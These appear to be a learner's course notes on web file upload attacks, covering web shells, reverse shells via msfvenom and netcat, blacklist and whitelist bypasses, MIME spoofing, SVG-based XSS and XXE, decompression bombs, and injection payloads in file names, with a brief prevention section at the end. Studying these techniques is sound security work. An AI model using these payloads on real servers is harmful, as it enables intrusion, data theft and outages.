# File Upload Attacks

## Intro to File Upload Attacks

a key feature of most web apps is to upload user files   
this comes with the risk of allowing users to store their malicious files on the web app back-end server  
could lead to arbitrary command execution to take control of backend server

### Types of file upload attacks 

most common reason for file upload vulnerabilities is weak file validation and verification  

worst possible kind of file upload vulnerability is an `unauthenticated arbitrary file upload`  
this will allow any unauthenticated user to upload any file type  

if filters such as extension and content validation are not secure then we might be able to bypass them 

most common and critical attack caused by arbitrary file uploads is `gaining remote command execution` over the backend server by uploading a web shell or script that sends a reverse shell  

web shell = execute any command and can be turned into an interactive shell  
reverse shell = upload script that sends shell to listener on our machine and interact with the remote server that way 

there may still be other ways to exploit the file upload functionality if protections are missing: 
- XSS or XXE
- DoS 
- overwrite critical system files and configs 
- etc

file upload vulnerabilities are not only caused by writing insecure functions but also by outdated libraries 

## Absent Validation 

the most basic type of file upload vulnerabilities occur when the app doesn't have any form of validation filters for uploaded files 

in these attacks we may directly upload our web shell or reverse shell and then visit the uploaded script to interact with our shell or send the reverse shell 

### Arbitrary file upload 

our target has an upload file field:  

![](Images/Pasted%20image%2020240207182323.png)

we can see that when we try to upload the file that all file types are allowed: 

![](Images/Pasted%20image%2020240207182401.png)

### Identifying web framework 

we need to upload a malicious script to test if we can upload any file type to the backend server so we can see if we can use this to exploit the server 

a web shell gives us an easy method to interact with the backend server by accepting shell commands and printing output back to us in the web browser  
needs to be written in the same language that runs the web server  

sometimes we can see the language by just looking at the page extension in the url, but some frameworks use web routes to map urls to web pages which might not show the extension  
also, with routes our file upload exploitation would be different because our files wouldn't be directly routable or accessible 

an easy way to see what language the server uses is visiting the `/index.ext` page where we would swap `ext` with common web extensions like `php`, `asp`, `aspx`, etc. 

when we try `/index.php` we get the same page we were visiting, which means that this is a PHP application: 

![](Images/Pasted%20image%2020240207182938.png)

using this or other methods like fuzzers may not always be accurate because web apps might not utilize index pages or may use more than one web extension 

could also use `wappalyzer` 

### Vulnerability identification 

now that we know that the server uses php we can submit a hello world php file and look for the ouput: 

![](Images/Pasted%20image%2020240207183844.png)

we could also use a script with something like `<?php echo system('hostname'); ?>`: 

![](Images/Pasted%20image%2020240207184236.png)

## Upload Exploitation 

### Web shells 

there are many web shells online that have different features/purposes   
PHP has `phpbash` which provides a terminal-like, semi-interactive web shell   
SecLists also has web shells for different frameworks and languages in `/opt/useful/SecLists/Web-Shells`

### Writing custom web shell 

for php we can use `system()` to execute system commands and print their output  
then we can use `cmd` with `$_REQUEST['cmd']`  
then when we visit our script on the app we can execute system commands with `?cmd=<command>`

remember that sometimes viewing the output in the source may be better 

for .NET apps we can pass the `cmd` parameter with `request('cmd')` to the `eval()` function and it should execute the command in `?cmd=` 

### Reverse shell 

a reliable reverse shell for PHP is `pentestmonkey`, but SecLists also has some 

to use pentestmonkey we can download the shell then edit in our target's IP and port, then we can start a netcat listener on our machine with the specified port with `nc -lnvp <port>`

### Generating custom reverse shell scripts 

always better to use core web framework functions to connect to our machine 

`msfvenom` can generate reverse shell scripts for many languages and might even try to bypass restrictions in place 

`msfvenom -p php/revers_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`

then we can again set up a listener with netcat and visit the uploaded file 


`-p` - payloads  
`-f` - specify output language

reverse shells are always preferred over web shells because they have the most interactive method for controlling the compromised server, but they might not always work  

## Client-Side Validation 

can easily bypass apps with only client-side validation by interacting with the server or by modifying the front-end code through the browser's dev tools

### Client-side validation 

now our target specifies a list of accepted file extensions, even if we select all file types: 

![](Images/Pasted%20image%2020240208090209.png)

no requests seem to be made and the page does not refresh  
we also have control over any client-side code executed in our browser  

### Back-end request modification 

when we upload a normal file and capture it with burp we can see the png request: 

![](Images/Pasted%20image%2020240208090956.png)

so now we can modify the filename and content to be our shell script and get a successful upload: 

![](Images/Pasted%20image%2020240208091258.png)

we could have also changed the `Content-Type` of the file but at this stage this shouldn't be too important 

we can revisit the site and see our uploaded script: 

![](Images/Pasted%20image%2020240208091800.png)

### Disabling front-end validation 

client-side code can be modified or disabled entirely 

in our example we can see an input element with `onchange` and `accept` attributes: 

![](Images/Pasted%20image%2020240208092324.png)

the `accept` isn't necessary to change because through the UI we can select "All Files"

with any function like the the one in `onchange` we can type the function name in the devtools console to get its details 

code like this we can simply remove via editing the HTML: 

![](Images/Pasted%20image%2020240208092639.png)

however these changes will not persist through page refresh 

## Blacklist Filters 

if type validation controls on the back-end server are not securely coded then there are still ways to bypass back-end protections 

### Blacklisting extensions 

with our new target if we try to use the previous methods of bypassing the front-end ocde we will still get an error: 

![](Images/Pasted%20image%2020240208093600.png)

there are generally two forms of validating file extensions on the back-end: 
- testing against a blacklist of types 
- testing against a whitelist of types 

the validation may also check the file type or file content for type matching  

the weakest form of these checks is using a blacklist   
this is because many other types of extensions can still be used to execute code for languages that may have their extensions blacklisted 

note that windows servers have case insensitive file names so we can try uploading files with mixed cases like `.pHp`

### Fuzzing extensions

since the app seems to be testing the file extension, we can first try to fuzz the upload functionality with a list of potential extensions 

payloadallthethings has a list of extensions for PHP and .NET   
SecLists has web extensions 

first we can send a valid upload request and send to burp intruder, then we can clear any positions that were created automatically and instead use the file extension position: 

![](Images/Pasted%20image%2020240208094636.png)

then we can upload the payloadallthethings PHP list into our payload options: 

![](Images/Pasted%20image%2020240208094830.png)

also make sure to uncheck URL encoding: 

![](Images/Pasted%20image%2020240208094901.png)

then based on the lengths of the responses we can see which extensions are valid: 

![](Images/Pasted%20image%2020240208095012.png)

### Non-blacklisted extensions 

even though we have many accepted extensions, they may not all work with the web server configs 

we can first try `phtml` which some php web servers will allow for code execution rights: 

![](Images/Pasted%20image%2020240208095610.png)

## Whitelist Filters 

### Whitelisting extensions

now our target has a whitelist filter that will block our previous payloads with uncommon php extensions like `phtml`: 

![](Images/Pasted%20image%2020240208101254.png)

now when we fuzz we see most uploads are blocked but some malicious extensions are still accepted: 

![](Images/Pasted%20image%2020240208101814.png)

if we look at an example of whitelist code: 

![](Images/Pasted%20image%2020240208101849.png)

we can see that a regex is used to test if the filename contains any of the valid extension names  
however, code like this only tests if the valid extension is contained, and doesn't check if it actually ends with the extension 

### Double extensions 

simply adding a valid extension before our desired extension may bypass above configured whitelists 

`shell.jpg.php`

### Reverse double extension 

sometimes the upload functionality itself won't be vulnerable, but the web server config  
the target may use an open source web app which has upload functionality, but even with a strict regex whitelist there still may be insecure configs 

the `/etc/apache2/mods-enabled/php7.4.conf` for the apache2 web server may have this config: 

![](Images/Pasted%20image%2020240208102938.png)

it determines which files allow php code execution, and for this example allows `.phar`, `.php`, and `.phtml`   
however this makes the same mistake in not checking the end of the filename   
in this case the file that contains any of the above extensions will be allowed PHP code execution, even if it doesn't end with the PHP extension

therefore payloads like `shell.php.jpg` will pass the previous whitelist for image files, and will be given PHP execution rights because it contains `.php` 

### Character injection 

we can inject several characters before or after the final extension to cause it to misinterpret the filename and execute the uploaded file as a PHP script 

- `%20`
- `%0a`
- `%00`
- `%0d0a`
- `/`
- `.\`
- `.`
- `...`
- `:`

`shell.php%00.jpg` for example will cause the web server to end the file name after `%00` and store it as `shell.php` but will still pass the whitelist   
the same works on windows servers with `:` before the extension like `shell.aspx:.jpg` 

this bash script will generate all permutations of the file name where the above characters will be injected before and after the jpg and php extensions: 

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps' '.phar' '.phtml'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

![](Images/Pasted%20image%2020240208104509.png)

## Type Filters

sometimes we can use some allowed extensions to perform other types of attacks   
most modern servers will also test the content of the file to ensure it matches the specified type   

content filters usually specify a single category (images, videos, documents) which means they don't typically use whitelists or blacklists   
web servers provide functions to check for the file content type 

two common methods for validating file content: 
- `Content-Type`
- `File Content`

### Content-Type

we can see an example of how a php web app might test the Content-Type header: 

![](Images/Pasted%20image%2020240208141801.png)

our browsers will automatically set the `Content-Type` header, which means that this is a client-side operation that we can manipulate 

SecLists has the content-type wordlist, and we can limit the list to only certain types like images with: 

```shell
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/web/content-type.txt
cat content-type.txt | grep 'image/' > image-content-types.txt
```

we can see that even changing the `image/png` header to `/jpg` will work: 

![](Images/Pasted%20image%2020240208142725.png)

a file upload HTTP request has two Content-Type headers, one for the attached file at the bottom and one for the full request   
usually only need to modify the files header but in some cases the request will only contain the main Content-Type header, in which case we would need to edit it 

### MIME-Type

a more common type of file content validation is testing the file's Multipurpose Internet Mail Extensions (MIME) type   

MIME determines the type of the file through its general format and byte structure   
this is usually checked by inspecting the first few bytes of the file's content which contain the `File signature` and `Magic Bytes`   
ex: `GIF87a` and `GIF89A` indicate a GIF image, and plaintext is usually a text file 

changing the first bytes of any file to the GIF magic bytes will change the entire MIME type 

note that many image types have non-printable bytes for their file signatures while GIF starts with ASCII

the `file` command on unix systems finds the file type through MIME: 

![](Images/Pasted%20image%2020240208145517.png)

we can see above that the file is recognized as ASCII text even with the `.jpg` extension 

if we instead use `GIF8` at the beginning then it will be considered a GIF: 

![](Images/Pasted%20image%2020240208145623.png)

a PHP sever might check for MIME type like: 

![](Images/Pasted%20image%2020240208145703.png)

we can use a combination of MIME type and Content-Type to bypass more robust content filters   
for example we could try: 
- allowed MIME type with disallowed Content-Type
- Allowed MIME/Content-Type with a disallowed extension 
- Disallowed MIME/Content-Type with an allowed extension 

## Limited File Uploads

even if we are dealing with a very limited file upload form that doesn't allow many of the previous methods we have tried previously, there are still ways to exploit the form

certain file types like SVG, HTML, and XML (and also some image and document files) may allow us to introduce new vulnerabilities to the web app  
this is why fuzzing allowed file extensions is so important 

### XSS 

many file types allow us to introduce a stored XSS vulnerability by uploading malicious versions of them 

most basic example is uploading HTML files that use JS code to carry an XSS or CSRF attack on whoever visits the uploaded HTML page 

another example is when an app displays an image's metadata after its upload   
we can include an XSS payload in one of the metadata parameters that accept raw text like the `Comment` or `Artist` parameters: 

```
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
exiftool HTB.jpg
```

also if we change the image's MIME-Type to `text/html` some web apps might show it as an HTML doc instead of an image, which will remove the need for the metadata to be displayed

SVG images can also be used for XSS  
SVG are XML-based and describe 2D vector graphics that the browser renders into an image, so we can modify the data to include an XSS payload: 

![](Images/Pasted%20image%2020240208163701.png)

### XXE 

similar attacks can be carried to lead to XXE exploitation   
SVGs can include malicious XML data to leak the source code of the web app and other internal docs within the server

![](Images/Pasted%20image%2020240208163852.png)

the above payload would get the info of `/etc/passwd` when the SVG image is uploaded and viewed  
the same attack could be done if the web app allows XML uploads

reading system files like `/etc/passwd` would give us information like the web app's source files   
for file upload exploitation it might let us: 
- locate the upload directory 
- identify allowed extensions 
- find the file naming scheme 

we could read source code with XXE with: 

![](Images/Pasted%20image%2020240208164157.png)

once the payload is displayed we would get the base64 encoded content of `index.php`  

XML can also be used by PDF, Word, PowerPoint, etc.   
if a web app used a document viewer that is vulnerable to XXE then we could modify the XML data to include XXE elements to carry a blind XXE attack on the back-end server 

we could also use XXE to enumerate hidden services or APIs to perform private actions that could lead to SSRF

### DoS 

many file upload attacks can lead to DoS 

can use a decompression bomb with file types that use data compression like ZIP and if the app auto-unzips then you could upload an archive with nested ZIP archives within it which can lead to petabytes of data 

a pixel flood attack might be possible with some image files that use image compression like JPG or PNG   
we can create a JPG file with any image size then manually modify it to be something like `0xFFFF x 0xFFFF` which results in an image of perceived size of 4 gigapixels  
an app that tries to display the image would crash 

some upload functions are vulnerable to directory traversal 

## Other Upload Attacks

### Injections in file name 

a common file upload attack uses the file name for the payload  
this may get executed or processed if the uploaded file name is displayed  
app could also use file name in OS command which we could inject commands into  

- `file$(whoami).jpg`
- `file.jpg||whoami`

could also use XSS in the file name for files names that are displayed to screen 

SQL queries would also work: 

`file';select+sleep(5);--.jpg`

### Upload directory disclosure 

in some forms like feedback or submission forms we might not have access to the link of our uploaded file and may not know the uploads directory  
could use fuzzing or LFI/XXE to find where the uploaded files are through the source code  

can also force errors to expose uploads directory  
could cause error by uploading file name that already exists or sending two identical requests at the same time 

could try uploading file with really long name 

### Windows-specific attacks 

could use reserved characters like `|`, `<`, `>`, `*`, or `?` which are usually used for special uses like wildcards  
these could be used to refer to another file that may not exist and cause an error to disclose upload directory  

use windows reserved names for the upload file names like `CON, COM1, LPT1, NUL` 

can also use the windows 8.3 filename convention to overwrite existing files or refer to files that don't exist   

older versions of windows used `~` to complete file names  

to refer to a file called `hackthebox.txt` we could use `HAC~1.TXT` or `HAC~2.TXT` where the digit is the order of the matching files that start with `HAC`  

windows still supports this naming convention so we could also write a file called `WEB~.CONF` to overwrite the `web.conf` file  


### Advanced file upload attacks 

any auto processing that occurs to an uploaded file like encoding a video, compressing a file, or renaming a file may be exploited

some commonly used libraries may have public exploits for these types of vulnerabilities like the AVI upload vulnerability leading to XXE in `ffmpeg`

## Preventing File Upload Vulnerabilities

### Extension validation 

need to make sure that out file upload functions can securely handle extension validation 

recommended to use both whitelisting for allowed extensions and blacklisting for dangerous extensions   
blacklist will prevent uploading malicious scripts if the whitelist is ever bypassed 

![](Images/Pasted%20image%2020240209142052.png)

